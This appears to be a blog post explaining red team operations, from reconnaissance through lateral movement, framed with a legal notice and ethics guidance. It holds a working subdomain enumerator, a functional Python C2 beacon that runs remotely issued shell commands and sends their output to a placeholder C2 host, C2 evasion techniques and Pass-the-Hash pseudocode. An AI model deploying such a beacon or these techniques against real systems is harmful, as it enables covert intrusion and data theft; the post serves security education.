---
title: "Understanding Red Team Operations: A Technical Deep Dive"
description:
  "Explore the methodologies, tools, and techniques used in professional red team engagements, from reconnaissance to
  post-exploitation."
pubDate: 2025-11-22T00:00:00Z
heroImage: ../../assets/blog/2002.i513.045..hackers army isometric.jpg
tags: ["red team", "penetration testing", "offensive security", "advanced"]
author: ebalo
---

import Mermaid from "@/components/astro/blog/mermaid.astro";
import Alert from "@/components/astro/blog/alert.astro";
import InfoBox from "@/components/astro/blog/info-box.astro";
import FeatureGrid from "@/components/astro/blog/feature-grid.astro";
import FeatureCard from "@/components/astro/blog/feature-card.astro";
import Newsletter from "@/components/astro/blog/newsletter.astro";

## What is Red Teaming?

Red teaming goes beyond traditional penetration testing by simulating real-world adversaries to test an organization's
detection and response capabilities. Unlike pentesting, which focuses on finding vulnerabilities, red teaming evaluates
the entire security program. A red team engagement assesses not just technical controls, but also people, processes, and
the organization's ability to detect and respond to sophisticated attacks over an extended period.

## Red Team Engagement Phases

<Mermaid code={`
graph TB
    A[Planning] --> B[Reconnaissance]
    B --> C[Initial Access]
    C --> D[Establish Foothold]
    D --> E[Privilege Escalation]
    E --> F[Lateral Movement]
    F --> G[Data Exfiltration]
    G --> H[Maintain Persistence]
    H --> I[Reporting]

    style A fill:#e3f2fd
    style C fill:#fff9c4
    style E fill:#ffccbc
    style G fill:#f8bbd0
    style I fill:#c8e6c9

`} />

<Alert title="Legal Notice" variant="warning">
  All techniques discussed in this article are for authorized security testing only. Unauthorized access to computer
  systems is illegal and punishable by law.
</Alert>

## Phase 1: Reconnaissance

Reconnaissance is the foundation of any successful red team operation. Professional red teamers spend significant time
gathering intelligence about their target before attempting any active engagement. This phase involves collecting
information from publicly available sources, analyzing the target's digital footprint, and building a comprehensive
understanding of the attack surface.

<Newsletter />

### OSINT (Open Source Intelligence)

Open source intelligence gathering leverages publicly available information to build a profile of the target
organization. Company websites often reveal technology stacks, employee names, and organizational structure. Job
postings inadvertently disclose internal tools, technologies, and security practices. Social media profiles provide
insights into employee relationships and potential social engineering vectors. DNS records and subdomain enumeration
reveal the extent of the target's internet-facing infrastructure. Public code repositories sometimes contain sensitive
information like API keys or architectural details. Data breach databases may contain previously compromised credentials
that could provide initial access.

Here's a Python script for subdomain enumeration:

```python
import dns.resolver
import concurrent.futures
from typing import Set, List

def check_subdomain(subdomain: str, domain: str) -> tuple[str, bool]:
    """
    Check if a subdomain exists for a given domain.

    Args:
        subdomain: The subdomain to check
        domain: The base domain

    Returns:
        Tuple of (full_domain, exists)
    """
    full_domain = f"{subdomain}.{domain}"
    try:
        answers = dns.resolver.resolve(full_domain, 'A')
        ips = [str(rdata) for rdata in answers]
        return (full_domain, True, ips)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
        return (full_domain, False, [])
    except Exception as e:
        return (full_domain, False, [])

def enumerate_subdomains(domain: str, wordlist: List[str]) -> Set[str]:
    """
    Enumerate subdomains using a wordlist.

    Args:
        domain: The target domain
        wordlist: List of potential subdomain names

    Returns:
        Set of discovered subdomains
    """
    discovered = set()

    print(f"[*] Enumerating subdomains for {domain}")
    print(f"[*] Testing {len(wordlist)} potential subdomains...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {
            executor.submit(check_subdomain, sub, domain): sub
            for sub in wordlist
        }

        for future in concurrent.futures.as_completed(futures):
            full_domain, exists, ips = future.result()
            if exists:
                discovered.add(full_domain)
                print(f"[+] Found: {full_domain}")
                for ip in ips:
                    print(f"    └─ {ip}")

    return discovered

# Example usage
if __name__ == "__main__":
    target_domain = "example.com"
    common_subdomains = [
        "www", "mail", "ftp", "admin", "portal",
        "vpn", "remote", "api", "dev", "staging",
        "test", "prod", "app", "dashboard", "secure"
    ]

    found_subdomains = enumerate_subdomains(target_domain, common_subdomains)
    print(f"\n[*] Total subdomains found: {len(found_subdomains)}")
```

## Phase 2: Initial Access

Once we've gathered intelligence, we need to gain initial access. The choice of attack vector depends on the target's
security posture and the rules of engagement. Phishing campaigns remain highly effective, using crafted emails that
trick users into providing credentials or executing malicious payloads. Web application exploitation targets
vulnerabilities like SQL injection, cross-site scripting, or remote code execution in internet-facing services.
Credential stuffing leverages leaked credentials from previous breaches to gain access to target systems. Social
engineering manipulates individuals to divulge confidential information or perform actions that compromise security.
Physical access attacks involve gaining unauthorized entry to facilities or direct access to devices. Supply chain
compromises target third-party vendors or service providers to gain indirect access to the target organization.

<FeatureGrid columns={3}>
  <FeatureCard title="Phishing">
    Crafted emails that trick users into providing credentials or executing malicious payloads through social
    manipulation.
  </FeatureCard>

{" "}
<FeatureCard title="Web Exploitation">
  Exploiting vulnerabilities in web applications like SQLi, XSS, or RCE to gain unauthorized access.
</FeatureCard>

{" "}
<FeatureCard title="Credential Stuffing">
  Using leaked credentials from previous breaches to gain access to target systems and services.
</FeatureCard>

{" "}
<FeatureCard title="Social Engineering">
  Manipulating individuals to divulge confidential information through psychological tactics.
</FeatureCard>

{" "}
<FeatureCard title="Physical Access">
  Gaining unauthorized physical access to facilities or devices through tailgating or bypass techniques.
</FeatureCard>

  <FeatureCard title="Supply Chain">
    Compromising third-party vendors or service providers to gain indirect access to the target.
  </FeatureCard>
</FeatureGrid>

## Phase 3: Command and Control (C2)

After gaining initial access, we need to establish a **command and control** channel. Here's the typical C2
architecture:

<Mermaid code={`
sequenceDiagram
    participant Operator
    participant C2Server as C2 Server
    participant Redirector
    participant Beacon as Implant/Beacon
    participant Target as Target Network

    Operator->>C2Server: Issue Command
    C2Server->>Redirector: Forward via HTTPS
    Redirector->>Beacon: Encrypted Communication
    Beacon->>Target: Execute Command
    Target->>Beacon: Return Results
    Beacon->>Redirector: Exfiltrate Data
    Redirector->>C2Server: Forward Results
    C2Server->>Operator: Display Output

    Note over Redirector,Beacon: Traffic appears legitimate

`} />

### C2 Evasion Techniques

Modern red team operations use sophisticated techniques to avoid detection by security monitoring systems. Domain
fronting hides the true destination of traffic behind trusted CDN services, making it appear as legitimate traffic to
major cloud providers. DNS tunneling exfiltrates data through DNS queries, bypassing traditional network monitoring that
focuses on HTTP/HTTPS traffic. Protocol mimicry makes C2 traffic look like legitimate protocols such as HTTPS or DNS,
blending in with normal network activity. Time-based execution ensures implants only communicate during business hours
when network activity is highest, reducing the chance of detection through anomalous timing patterns. Jitter and
randomized sleep intervals prevent security systems from identifying regular beacon patterns that indicate compromised
hosts.

Here's a simple C2 beacon implementation:

```python
import requests
import time
import random
import subprocess
import base64
from typing import Optional

class C2Beacon:
    """
    Simple C2 beacon for demonstration purposes.
    In real scenarios, this would be much more sophisticated.
    """

    def __init__(self, c2_url: str, beacon_id: str, jitter: float = 0.3):
        self.c2_url = c2_url
        self.beacon_id = beacon_id
        self.jitter = jitter
        self.sleep_time = 60  # Base sleep time in seconds

    def apply_jitter(self, base_time: int) -> int:
        """Apply jitter to avoid predictable beacon intervals."""
        jitter_range = base_time * self.jitter
        return base_time + random.uniform(-jitter_range, jitter_range)

    def check_in(self) -> Optional[dict]:
        """Check in with C2 server and retrieve tasks."""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Beacon-ID': self.beacon_id
            }

            response = requests.get(
                f"{self.c2_url}/api/beacon/checkin",
                headers=headers,
                timeout=10,
                verify=True  # In production, you'd handle cert pinning
            )

            if response.status_code == 200:
                return response.json()

        except requests.exceptions.RequestException as e:
            # Silently fail - don't alert the blue team!
            pass

        return None

    def execute_task(self, task: dict) -> str:
        """Execute a task received from C2."""
        command_type = task.get('type')
        command_data = task.get('data')

        if command_type == 'shell':
            try:
                result = subprocess.run(
                    command_data,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return base64.b64encode(result.stdout.encode()).decode()
            except Exception as e:
                return base64.b64encode(f"Error: {str(e)}".encode()).decode()

        elif command_type == 'sleep':
            self.sleep_time = int(command_data)
            return "Sleep interval updated"

        elif command_type == 'die':
            return "Terminating beacon"

        return "Unknown command type"

    def send_results(self, task_id: str, results: str) -> bool:
        """Send task results back to C2."""
        try:
            payload = {
                'beacon_id': self.beacon_id,
                'task_id': task_id,
                'results': results
            }

            response = requests.post(
                f"{self.c2_url}/api/beacon/results",
                json=payload,
                timeout=10
            )

            return response.status_code == 200

        except requests.exceptions.RequestException:
            return False

    def run(self):
        """Main beacon loop."""
        print(f"[*] Beacon {self.beacon_id} starting...")

        while True:
            # Check in with C2
            task = self.check_in()

            if task:
                # Execute task
                results = self.execute_task(task)

                # Send results
                self.send_results(task.get('task_id'), results)

                # Check if we should terminate
                if task.get('type') == 'die':
                    break

            # Sleep with jitter
            sleep_time = self.apply_jitter(self.sleep_time)
            time.sleep(sleep_time)

# Example (DO NOT USE IN UNAUTHORIZED TESTING)
# beacon = C2Beacon("https://c2.example.com", "beacon-001")
# beacon.run()
```

## Phase 4: Privilege Escalation

After establishing access, we typically need elevated privileges. Common Windows privilege escalation techniques:

| Technique                 | Description                                   | Difficulty  |
| ------------------------- | --------------------------------------------- | ----------- |
| Token Impersonation       | Steal access tokens from privileged processes | Medium      |
| UAC Bypass                | Circumvent User Account Control               | Easy-Medium |
| Kernel Exploits           | Exploit OS vulnerabilities                    | Hard        |
| Service Misconfigurations | Abuse weak service permissions                | Easy        |
| DLL Hijacking             | Place malicious DLL in search path            | Medium      |
| Scheduled Tasks           | Exploit weak scheduled task permissions       | Easy-Medium |

## Phase 5: Lateral Movement

Once we have privileged access on one system, we move laterally across the network:

<Mermaid code={`
graph TB
    A[Initial Compromise Workstation] --> B{Credential Harvesting}
    B -->|Mimikatz| C[Domain Admin Hash]
    B -->|Password Spray| D[Multiple Users]

    C --> E[Domain Controller]
    D --> F[File Server]
    D --> G[Database Server]

    E --> H[Golden Ticket]
    F --> I[Sensitive Data]
    G --> J[PII/Financial Data]

    H --> K[Complete Domain Compromise]

    style A fill:#ffebee
    style C fill:#fff9c4
    style E fill:#e1f5fe
    style K fill:#c8e6c9

`} />

### Pass-the-Hash Attack

Here's a simplified explanation of Pass-the-Hash:

```python
"""
Pass-the-Hash (PtH) Attack Simulation
Note: This is educational pseudocode, not a working exploit
"""

def pass_the_hash_attack(target_ip: str, username: str, ntlm_hash: str):
    """
    Simulate a Pass-the-Hash attack.

    In a real PtH attack:
    1. Extract NTLM hash from compromised system (e.g., using Mimikatz)
    2. Use hash directly for authentication (no need to crack password)
    3. Authenticate to remote systems using the hash
    """

    # Step 1: Format the hash
    lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM hash
    nt_hash = ntlm_hash

    # Step 2: Create NTLM authentication
    # (In reality, this involves complex NTLM protocol implementation)
    print(f"[*] Attempting PtH attack on {target_ip}")
    print(f"[*] Username: {username}")
    print(f"[*] NTLM Hash: {nt_hash}")

    # Step 3: Authenticate using hash (pseudocode)
    """
    from impacket.smbconnection import SMBConnection

    conn = SMBConnection(target_ip, target_ip)
    conn.login(username, '', lmhash=lm_hash, nthash=nt_hash)

    if conn.isGuestSession():
        print("[-] Authentication failed")
    else:
        print("[+] Successfully authenticated!")
        # Now you can execute commands, access shares, etc.
    """

    return "Educational demonstration only"

# Real-world tools for PtH:
# - Mimikatz
# - Impacket
# - CrackMapExec
# - Metasploit
```

## Red Team vs Blue Team

Understanding both sides makes you a better security professional. Red teams simulate real attackers to find
vulnerabilities before malicious actors do, test detection and response capabilities, and challenge assumptions about
security controls. They operate with an offensive mindset, constantly looking for weaknesses in technical controls,
processes, and human factors. Blue teams monitor and defend systems, detect and respond to threats, implement security
controls, and learn from red team findings. They maintain a defensive posture, continuously improving detection
capabilities and response procedures based on both real incidents and red team exercises. The interaction between red
and blue teams creates a feedback loop that strengthens overall security posture.

## Essential Red Team Tools

Professional red teamers rely on a curated toolset covering every phase of an engagement. Reconnaissance tools like Nmap
provide network scanning and service detection, while Masscan offers high-speed port scanning capabilities. Amass excels
at subdomain enumeration, and theHarvester automates OSINT gathering from multiple sources. For initial access,
Metasploit provides a comprehensive exploitation framework, and Cobalt Strike offers commercial C2 capabilities with
advanced evasion features. Gophish enables realistic phishing campaign simulations, while SET (Social Engineering
Toolkit) automates various social engineering attacks.

Post-exploitation tools become critical after gaining initial access. Mimikatz extracts credentials from Windows
systems, BloodHound visualizes Active Directory attack paths, and PowerSploit provides PowerShell-based
post-exploitation modules. Empire offers both PowerShell and Python post-exploitation capabilities with a user-friendly
interface. For maintaining persistence, SharPersist provides a Windows persistence toolkit, Impacket implements network
protocols for lateral movement, and Covenant offers a .NET-based C2 framework with strong operational security features.

## Best Practices for Red Team Operations

Professional red team engagements require strict adherence to ethical and operational guidelines. Always obtain proper
written authorization with signed agreements before beginning any testing activities. Define clear rules of engagement
that specify what is in scope and out of scope, including systems, timeframes, and acceptable techniques. Maintain
operational security throughout the engagement to protect client data and engagement details from disclosure. Document
every action taken during the engagement with detailed logs for reporting and legal protection.

Communicate responsibly by reporting critical findings immediately rather than waiting for the final report, especially
for actively exploited vulnerabilities. Clean up after yourself by removing persistence mechanisms, backdoors, and
artifacts created during testing. Provide actionable remediation guidance that helps the client fix identified issues
rather than just documenting problems. Remember that the goal is improving security, not just demonstrating technical
skills.

## Conclusion

Red team operations are complex, multifaceted engagements that require deep technical knowledge, creativity, and ethical
responsibility. By simulating sophisticated adversaries, red teams help organizations understand their true security
posture and improve their defensive capabilities.

Professional red teaming goes beyond finding vulnerabilities to testing an organization's entire security program,
including people, processes, and technology. The insights gained from these engagements enable organizations to
prioritize security investments, improve detection capabilities, and build more resilient systems. Red teaming is about
improving security through adversarial simulation, helping organizations prepare for real threats they will inevitably
face.

### Further Reading

The MITRE ATT&CK Framework provides comprehensive documentation of adversary tactics and techniques observed in
real-world attacks. Red Team Development and Operations offers practical guidance for conducting professional
engagements. The Awesome Red Teaming repository curates tools, resources, and learning materials. The Red Teaming
Handbook covers practical aspects of planning and executing engagements from initial scoping through final reporting.
